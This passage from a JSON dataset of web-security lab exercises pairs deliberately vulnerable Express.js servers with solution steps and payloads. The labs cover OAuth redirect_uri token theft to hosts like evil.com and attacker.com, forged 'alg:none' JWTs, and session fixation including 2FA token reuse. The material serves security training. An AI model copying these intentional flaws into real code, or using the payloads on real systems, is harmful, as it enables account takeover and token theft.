    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = 'token_' + Math.random().toString(36).substring(2); tokens[user] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const user = Object.keys(tokens).find(u => `Bearer ${tokens[u]}` === auth); if (user === 'carlos') res.send('Carlos account data'); else res.status(401).send('Unauthorized'); }); app.listen(8080);",
    "payloads": [
      "Modified redirect_uri=https://attacker.com/callback",
      "OAuth URL: /authorize?redirect_uri=https://attacker.com/callback&user=carlos",
      "Authorization header: Bearer token_xxxxxx"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in login authentication",
    "Lab Description": "The application uses JWTs to manage user sessions. However, it improperly trusts the 'alg' field from user-supplied tokens without validating the signature. The application accepts tokens where 'alg' is set to 'none'. To solve: forge a valid token for the admin user and access the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the POST /login request and extract the JWT from the Set-Cookie header.",
      "2. Decode the JWT at jwt.io and observe the header and payload fields.",
      "3. Modify the header to use 'alg':'none' and change the payload to 'username':'admin'.",
      "4. Remove the signature part entirely and send the modified JWT in the Cookie header using Postman or Burp.",
      "5. Access /admin-dashboard and verify admin privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.cookie('session', token).send('Logged in'); }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') { return res.send('Welcome admin!'); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }."
    ]
  },
  {
    "Lab scenario": "Open redirect flaw in OAuth redirect_uri parameter",
    "Lab Description": "This lab implements OAuth login flow using a third-party provider. The `redirect_uri` parameter is improperly validated, allowing redirection to arbitrary domains. To solve: intercept the OAuth flow and steal an access token via redirection to a malicious endpoint under your control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the login with OAuth from the target app and intercept the initial authorization URL using Burp Suite.",
      "2. Modify the 'redirect_uri' parameter to redirect to your malicious host (e.g., https://evil.com/callback).",
      "3. Host a listener or server on https://evil.com to capture the incoming request with the access_token.",
      "4. Complete the flow and monitor your server logs for the leaked token.",
      "5. Replay the token in an authenticated API request using Postman to retrieve the user profile and access restricted data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?access_token=1234567890abcdef`); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === '1234567890abcdef') return res.send('User profile: admin'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirection Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://evil.com/callback",
      "https://malicious.site/steal?access_token=1234567890abcdef",
      "redirect_uri=https://attacker.com/receive"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in authentication process",
    "Lab Description": "The login endpoint does not issue a new session identifier after successful authentication. This allows an attacker to fix a session ID before login and hijack the user session afterward. To solve: fix a session ID, get the victim to log in using it, then access their account using the same session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to visit the site and note the session cookie issued before login (e.g., session=abcd1234).",
      "2. Send this session ID to the victim and entice them to log in while using it (via a phishing link or XSS vector).",
      "3. Once the victim logs in with the fixed session ID, reuse it to access /my-account.",
      "4. Verify you now have access to their authenticated session.",
      "5. Visit /my-account while reusing the session cookie and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[session] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page for ${user}`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "session=abcd1234",
      "GET /login with predefined cookie",
      "Cookie: session=abcd1234"
    ]
  },
  {
    "Lab scenario": "Session fixation via MFA token reuse in REST login flow",
    "Lab Description": "The application uses a RESTful login flow with 2FA implemented through a token verification endpoint. However, the token is bound to the session in an insecure way. The application reuses the 2FA token without revalidating the session context, allowing an attacker to hijack a victim's session post-authentication. To solve: Fixate your session during pre-authentication and inject a valid 2FA token generated by the victim to gain access to their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy to log in with your own credentials and intercept the POST /api/generate-2fa-token request.",
      "Send the 2FA generation request to Repeater, change the 'username' field to 'carlos' and capture the valid token.",
      "Start a new session using incognito mode and intercept the pre-login request to POST /api/session.",
      "Send the session cookie along with the stolen 2FA token to the POST /api/verify-2fa endpoint.",
      "Upon successful response, access /api/user-profile using the fixed session to verify account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const sessions = {}; const tokens = {}; app.use(bodyParser.json()); app.post('/api/session', (req, res) => { const sid = 'sess_' + Date.now(); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ sid }); }); app.post('/api/generate-2fa-token', (req, res) => { const { username } = req.body; tokens[username] = '112233'; res.json({ message: 'Token sent' }); }); app.post('/api/verify-2fa', (req, res) => { const sid = req.cookies.session; const { username, token } = req.body; if (tokens[username] === token) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.json({ success: true }); } res.status(403).json({ error: 'Invalid token' }); }); app.get('/api/user-profile', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated) return res.send('Welcome ' + sessions[sid].user); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "{\"username\":\"carlos\"}",
      "{\"username\":\"carlos\",\"token\":\"112233\"}"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
    "Lab Description": "The application integrates with a third-party OAuth provider using the implicit flow, but does not properly validate redirect URIs. This allows an attacker to inject a malicious redirection target and capture the access token from the URL fragment. To solve: Exploit the OAuth flow to extract Carlos’s access token and use it to access his private user dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the login link to the OAuth provider and intercept the OAuth authorization request.",
      "Modify the redirect_uri parameter to point to your own server or Burp Collaborator.",
      "Trigger the OAuth login flow using Carlos’s session (use session fixation or phishing).",
      "Capture the access token leaked in the URL fragment via your redirect URI endpoint.",
      "Replay the token in the Authorization header to access the victim's /dashboard endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const tokenCache = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Buffer.from(user + ':token123').toString('base64'); tokenCache[user] = token; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/dashboard', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); const username = decoded.split(':')[0]; if (tokenCache[username] === token) return res.send('Dashboard for ' + username); res.status(403).send('Access denied'); }); app.listen(4001);",
    "payloads": [
      "https://malicious.example.com/#access_token=carlos:token123",
      "Authorization: Bearer Y2FybG9zOnRva2VuMTIz"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass using 'none' algorithm",
    "Lab Description": "The application uses JWT for session management. However, it incorrectly accepts tokens with the 'alg':'none' header and skips signature verification. An attacker can forge a token and impersonate any user. To solve: Create a tampered token that impersonates the admin user and access the protected admin panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a GET /jwt-login request and extract your valid JWT.",
      "Decode the JWT using jwt.io or Burp Decoder and note the structure.",
      "Craft a new token with header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Remove the signature.",
      "Send the forged token in Authorization: Bearer header to /admin-dashboard.",
      "Confirm admin access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/jwt-login', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret); res.send({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  }
]